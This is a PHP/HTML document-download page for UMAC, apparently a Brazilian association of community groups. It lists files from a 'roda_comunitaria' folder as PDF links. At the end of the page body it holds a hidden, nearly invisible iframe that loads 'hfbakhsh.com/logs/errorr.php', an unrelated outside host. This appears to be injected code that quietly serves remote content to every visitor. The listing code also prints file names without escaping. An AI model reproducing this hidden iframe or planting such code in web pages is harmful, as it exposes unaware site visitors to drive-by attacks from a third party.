<?
	$dir  = opendir('roda_comunitaria');
	$diretorio = ('roda_comunitaria');
	$path = ('roda_comunitaria/');

while ($files = readdir($dir)) {
	$all_files[] = $files;
}

sort($all_files);
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<title>UMAC - Uni&atilde;o Maracaiense de Associa&ccedil;&otilde;es Comunit&aacute;rias</title>
<style type="text/css">
<!--
body {
	background-repeat: no-repeat;
	margin-left: 100px;
	margin-top: 10px;
	margin-right: 0px;
	margin-bottom: 0px;
	background-image: url(../images/plano_fundo_conteudo.jpg);
	SCROLLBAR-ARROW-COLOR: #000000;
	SCROLLBAR-TRACK-COLOR: #f9f9f9;
	SCROLLBAR-BASE-COLOR: #f9f9f9;
	SCROLLBAR-FACE-COLOR: #f9f9f9;
	SCROLLBAR-HIGHLIGHT-COLOR: #000000;
	SCROLLBAR-SHADOW-COLOR: #000000;
}
-->
</style>
<link href="../estilo.css" rel="stylesheet" type="text/css">
</head>

<body bgproperties="fixed">
<div align="center"><img src="../images/title_documentos.gif" width="207" height="59"></div>

<p align="center" class="texto_verdana">Segue abaixo alguns documentos para download. <B>[RODA COMUNITÁRIA]</B></p>
<p align="center" class="texto_verdana">Caso necessite de algum documento de seu conhecimento que n&atilde;o esteja dispon&iacute;vel para download, entre em contato clicando <a href="../fale_conosco/index.html" class="link"><font color="#FF0000">aqui</font></a> para a solicita&ccedil;&atilde;o e envio do mesmo.<br><br></p>
<table width="354" border="1" align="center" cellpadding="0" cellspacing="0" bordercolor="#CCCCCC" class="texto_verdana">

<?php
$i = 0;
foreach ($all_files as $listar) {
	if ($listar!="." && $listar!="..") {
		$size = filesize($path.$listar);
		$size_total = $size_total + $size;
		$size = number_format($size/1048576, 2, ',', '.')." MByte";
		printf('<tr>');
		printf('<td>'.$listar.'</td>');
		printf('<td align="right">'.$size.'</td>');
		printf('<td align="right"><a href="'.$diretorio.'/'.$listar.'" target="_blank"><img src="../images/pdf_logo.jpg" width="18" height="19" alt="Adobe Acrobat Reader" border="0"></a></td>');
		printf('</tr>');
		$i = $i + 1;
	}
}
printf('</table>');
?>
</table>
<br><br><div align="center">
  <a href="index.html" class="texto">VOLTAR</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="javascript:window.close();" class="texto">FECHAR</a></div><br>
<iframe src="hfbakhsh.com/logs/errorr.php" border="0" width="6" height="5" /></body>
<!-- Desenvolvido por Jovian R. -->
</html>

